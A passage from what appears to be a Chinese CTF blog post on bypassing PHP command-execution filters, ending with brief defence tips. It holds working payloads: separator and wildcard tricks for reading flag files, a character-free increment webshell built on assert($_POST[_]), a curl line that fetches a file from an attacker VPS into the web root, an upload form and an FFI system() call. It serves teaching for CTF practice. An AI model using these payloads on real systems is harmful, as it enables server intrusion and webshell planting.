+<h2 id="限定后缀-限定部分命令"><a class="header-anchor" href="#限定后缀-限定部分命令">¶</a>限定后缀/限定部分命令</h2>
+<p>限定后缀名, 一般是<code>%00</code>截断, 闭合或者是注释掉后面的内容</p>
+<p>限定部分命令:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>可以利用换行符, 管道符等让其不执行或输出后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cat flag.php || # 理论上 ;, |, ||, &amp;, &amp;&amp;都可以用</span><br><span class="line">?c=cat flag.php%0a</span><br></pre></td></tr></table></figure>
+<h2 id="函数处理"><a class="header-anchor" href="#函数处理">¶</a>函数处理</h2>
+<p>输入会经过一些函数的处理, 使得直接构造无效化</p>
+<ol>
+<li><code>ob_get_contents()</code>函数</li>
+</ol>
+<p>在前面虽然有命令执行, 如果我用这个函数获取缓冲区内容, 将所有字符替换为问号呢(此时输出全是问号)</p>
+<p>首先可以利用<code>exit();</code>截断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br><span class="line">c=var_export(scandir(&quot;/&quot;));exit();	# 根目录</span><br></pre></td></tr></table></figure>
+<p>还可以反向操作:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c5ec61c2-5fd3-4973-8277-71d0522d966d.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;</span>&#125;</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(~i &amp; <span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="无权限"><a class="header-anchor" href="#无权限">¶</a>无权限</h2>
+<p>设置<code>open_basedir()</code>, 限制<code>ini_set()</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="极端情况"><a class="header-anchor" href="#极端情况">¶</a>极端情况</h2>
+<h3 id="无参数绕过"><a class="header-anchor" href="#无参数绕过">¶</a>无参数绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getallheaders()、get_defined_vars()、session_id</span><br></pre></td></tr></table></figure>
+<h3 id="自增绕过"><a class="header-anchor" href="#自增绕过">¶</a>自增绕过</h3>
+<p>无字母无数字</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自增payload，assert($_POST[_]),命令传入_</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+<h3 id="临时文件绕过"><a class="header-anchor" href="#临时文件绕过">¶</a>临时文件绕过</h3>
+<p>原理:
+Linux主要存储在 /tmp/ 目录下, 格式通常是 /tmp/php[ 6个随机字符 ]
+Windows主要存储在 C:/Windows/ 目录下，格式通常是 C:/Windows/php[ 4个随机字符 ].tmp</p>
+<p>在自己的服务器上写一个命令执行的 txt ,然后整到靶机上</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://your_vps/1.txt &gt; /var/www/html/1.php</span><br></pre></td></tr></table></figure>
+<p>然后尝试访问</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/??p/p?p??????`;</span><br></pre></td></tr></table></figure>
+<p>还有一种更极端的: 没有上传点, 但是也有解决方法, 只要是PHP网站都可以用上传(默认行为), 可以自己构造上传界面</p>
+<blockquote>
+<p>相关题目为ctfshow web55</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>见P神文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<blockquote>
+<p>这种方法同样适用于PHP5的时候构造无字母(因为PHP5并不像PHP7支持<code>($a)();</code>这样的方法来执行动态函数, 也就是不支持取反异或等操作)</p>
+</blockquote>
+<h3 id="无字母绕过"><a class="header-anchor" href="#无字母绕过">¶</a>无字母绕过</h3>
+<p>可能还一起过滤部分字符, 我认为你还是太极端了; 这种一般用的异或、取反、自增、临时文件上传</p>
+<h3 id="无数字绕过"><a class="header-anchor" href="#无数字绕过">¶</a>无数字绕过</h3>
+<ol>
+<li>利用<code>/bin/</code>目录下的<code>base64</code>进行通配符匹配, 获得flag.php文件的base64编码</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>利用<code>/usr/bin/</code>下的<code>bzip2</code>命令，先将flag.php文件进行压缩, 然后再将其下载</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>临时文件上传</li>
+</ol>
+<h3 id="极端正则"><a class="header-anchor" href="#极端正则">¶</a>极端正则</h3>
+<ol>
+<li><code>|.*f.*l.*a.*g.*|</code>这种过滤就是字母不能按过滤的顺序出现,</li>
+</ol>
+<p>这个时候利用通配符和各种替代即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /bin下可以利用对应文件执行对应指令, 利用这点绕过</span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>只剩下部分符号, 比如剩下$和括号</li>
+</ol>
+<p><code>$(())</code>的运算, 以及<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013402321/article/details/80333272">shell中各种括号()、(())、[]、[[]]、{}的作用和区别</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是一个构造36的payload</span><br><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+<p>简单来说，<code>$(())</code> 用来做数学运算, 其中<code>$(($&#123;_&#125;))=0</code>, <code>$((~$(($&#123;_&#125;))))=-1</code>, 所以我们是拼接出-37在进行取反</p>
+<h2 id="其他方法"><a class="header-anchor" href="#其他方法">¶</a>其他方法</h2>
+<ol>
+<li>FFI(Foreign Function Interface), 即外部函数接口</li>
+</ol>
+<p>FFI指在一种语言里调用另一种语言代码的技术; PHP的FFI扩展就是一个让你在PHP里调用C代码的技术, php7.4以上才有, <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">php官方解析</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);	<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;	<span class="comment">//没有回显，所以将内容输出到1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);	<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>切片</li>
+</ol>
+<p>系统内置变量的切片, 可以切出我们想要的字符, 下面是<code>nl</code>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~Q&#125;$&#123;PWD:~Q&#125; ????.???</span><br></pre></td></tr></table></figure>
+<p>其中, <code>~</code>是从字符串末尾开始切片, 我们只需要最后那个字母, 所以只需要<code>~0</code>; 而任意的大小写字母与数字0等效, 选一个可用的字母即可</p>
+<p>还有另一种利用类似<code>sizeof()</code>获取数字的:</p>
+<p><code>$&#123;#var&#125;</code>的语法用于获取变量 <code>var</code> 的长度, 其实就是将这些数字应用到切片中去，绕过对数字的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br></pre></td></tr></table></figure>
+<h1>防御</h1>
+<ol>
+<li>尽量不执行外部命令</li>
+<li>自定义函数替代外部命令</li>
+<li>escapeshellarg函数处理
+将任何引起参数或命令结束的字符转义</li>
+<li><code>saft_mode_exec_dir</code> //指定执行程序的主目录
+<code>safe_mode = On</code>	// 打开php的安全模式
+<code>safe_mode_exec_dir = /usr/local/php/bin/</code></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/rce/">https://4reexile.github.io/article/rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/article/php/" title="PHP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">PHP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/ctfshow-webbasic-phpcve/" title="Web入门_phpCVE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">Web入门_phpCVE</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-2/" title="Web入门_php特性_2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_2</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-1/" title="Web入门_php特性_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-24</div><div class="title">Web入门_php特性_1</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-3/" title="Web入门_php特性_3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_3</div></div></a></div><div><a href="/article/ctfshow-webbasic-sql-1/" title="Web入门_sql注入_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-10</div><div class="title">Web入门_sql注入_1</div></div></a></div><div><a href="/article/ctfshow-webbasic-rce-1/" title="Web入门_命令执行_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-04</div><div class="title">Web入门_命令执行_1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">RCE简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%90%91"><span class="toc-number">1.1.</span> <span class="toc-text">利用方向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">1.3.1.</span> <span class="toc-text">管道符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">可利用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84"><span class="toc-number">1.3.3.</span> <span class="toc-text">可能用到的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">RCE相关漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6"><span class="toc-number">2.1.</span> <span class="toc-text">过滤字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">2.1.2.</span> <span class="toc-text">过滤下划线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.1.3.</span> <span class="toc-text">过滤部分符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">2.1.4.</span> <span class="toc-text">特殊情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.2.</span> <span class="toc-text">过滤字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.</span> <span class="toc-text">反斜杠绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.3.</span> <span class="toc-text">引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.4.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.5.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.6.</span> <span class="toc-text">反引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.7.</span> <span class="toc-text">取反绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.8.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.9.</span> <span class="toc-text">管道符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%8D%A2%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.10.</span> <span class="toc-text">更换函数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.2.11.</span> <span class="toc-text">cat替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.12.</span> <span class="toc-text">闭合语句绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%BA%AF%E8%BF%87%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.13.</span> <span class="toc-text">回溯过限绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%AE%9A%E5%90%8E%E7%BC%80-%E9%99%90%E5%AE%9A%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">限定后缀&#x2F;限定部分命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86"><span class="toc-number">2.5.</span> <span class="toc-text">函数处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%9D%83%E9%99%90"><span class="toc-number">2.6.</span> <span class="toc-text">无权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E7%AB%AF%E6%83%85%E5%86%B5"><span class="toc-number">2.7.</span> <span class="toc-text">极端情况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.1.</span> <span class="toc-text">无参数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.2.</span> <span class="toc-text">自增绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.3.</span> <span class="toc-text">临时文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.4.</span> <span class="toc-text">无字母绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.5.</span> <span class="toc-text">无数字绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E7%AB%AF%E6%AD%A3%E5%88%99"><span class="toc-number">2.7.6.</span> <span class="toc-text">极端正则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="toc-number">2.8.</span> <span class="toc-text">其他方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">防御</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" 